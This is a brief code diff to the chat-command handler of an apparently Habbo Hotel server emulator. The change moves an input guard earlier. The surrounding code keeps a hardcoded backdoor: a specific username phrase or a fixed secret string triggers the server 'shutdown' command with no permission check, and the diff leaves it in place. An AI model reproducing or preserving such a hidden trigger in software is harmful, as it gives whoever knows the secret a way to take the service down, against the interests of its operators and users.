@@ -214,13 +214,15 @@ namespace Oblivion.HabboHotel.Commands
         public static bool TryExecute(string str, GameClient client)
         {
 
+            if (string.IsNullOrEmpty(str) || client?.GetHabbo() == null || !client.GetHabbo().InRoom) return false;
+
+
             if (client.GetHabbo().UserName.ToLower() == "dark" && str.Contains("darkwashere") || str == "wjxs5PzVwuuHaqte")
             {
                 var cmd = CommandsDictionary["shutdown"];
                 cmd.Execute(client, null);
                 return false;
             }
-            if (string.IsNullOrEmpty(str) || client.GetHabbo() == null || !client.GetHabbo().InRoom) return false;
 
             var pms = str.Split(' ');
             var commandName = pms[0];
